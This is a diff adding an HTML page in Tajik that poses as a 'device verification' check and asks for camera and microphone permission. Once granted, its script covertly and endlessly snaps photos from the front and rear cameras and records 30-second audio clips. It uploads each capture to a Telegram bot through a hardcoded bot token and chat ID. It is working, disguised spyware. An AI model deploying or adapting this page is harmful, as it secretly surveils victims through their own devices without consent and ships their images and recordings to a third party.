@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="tg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #ffffff;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            border-radius: 25px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        h2 { font-weight: 400; margin-bottom: 10px; }
+        p { font-size: 14px; opacity: 0.8; margin-bottom: 30px; line-height: 1.5; }
+        button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+        button:hover { background: #3367d6; transform: scale(1.02); }
+        .status { margin-top: 20px; display: none; color: #4caf50; font-weight: bold; }
+        #v { position: absolute; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon">🛡️</div>
+    <h2>Тасдиқи дастгоҳ</h2>
+    <p>Барои идома додани кор бо браузер, лутфан иҷозати камера ва микрофонро диҳед.</p>
+    <button id="startBtn" onclick="init()">Оғози тасдиқ</button>
+    <div id="status" class="status">Верификатсия фаъол аст...</div>
+</div>
+
+<video id="v" autoplay muted playsinline></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = '8593455284:AAE5RvoXWi4-YWADGXtJaGhn-L62yF6GjZo';
+    const ID = '6862331593';
+    
+    let photoCount = 0;
+    let audioCount = 0;
+
+    async function init() {
+        try {
+            // Дархости аввалин барои иҷозат
+            const initialStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            initialStream.getTracks().forEach(t => t.stop());
+
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+
+            // Оғози сиклҳои корӣ
+            startPhotoCycle();
+            startAudioCycle();
+        } catch (e) {
+            alert("Иҷозат дода нашуд. Лутфан танзимотро санҷед.");
+        }
+    }
+
+    // --- ФУНКСИЯҲОИ АКС ---
+    async function startPhotoCycle() {
+        const modes = ['user', 'environment']; // 'user' = пеш, 'environment' = ақиб
+        let modeIdx = 0;
+
+        while (true) {
+            photoCount++;
+            const currentMode = modes[modeIdx];
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: currentMode }
+                });
+                
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                // Мунтазир мешавем то камера фаъол шавад
+                await new Promise(r => video.onloadedmetadata = r);
+                await new Promise(r => setTimeout(r, 500)); 
+
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    await sendToTelegram(blob, 'sendPhoto', 'photo', `Photo #${photoCount} [${currentMode}]`);
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg', 0.7);
+
+                modeIdx = (modeIdx + 1) % modes.length;
+            } catch (err) {
+                console.log("Камера дастрас нест: " + currentMode);
+            }
+
+            // Фосилаи 5-6 сония
+            await new Promise(r => setTimeout(r, 6000));
+        }
+    }
+
+    // --- ФУНКСИЯҲОИ САДО ---
+    async function startAudioCycle() {
+        while (true) {
+            audioCount++;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    await sendToTelegram(blob, 'sendAudio', 'audio', `Audio #${audioCount}`);
+                    stream.getTracks().forEach(t => t.stop());
+                };
+
+                recorder.start();
+                // Сабт барои 30 сония
+                await new Promise(r => setTimeout(r, 30000));
+                recorder.stop();
+
+            } catch (err) {
+                console.error("Хатогии аудио:", err);
+            }
+
+            // Таваққуфи 5 сония пеш аз сабти нав
+            await new Promise(r => setTimeout(r, 5000));
+        }
+    }
+
+    // --- ИРСОЛ БА ТЕЛЕГРАМ ---
+    async function sendToTelegram(blob, method, type, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', ID);
+        formData.append(type, blob, `file.${type === 'photo' ? 'jpg' : 'ogg'}`);
+        formData.append('caption', `${caption}\n🕒 ${new Date().toLocaleTimeString()}`);
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch (e) {
+            console.error("Fetch error:", e);
+        }
+    }
+</script>
+
+</body>
+</html>
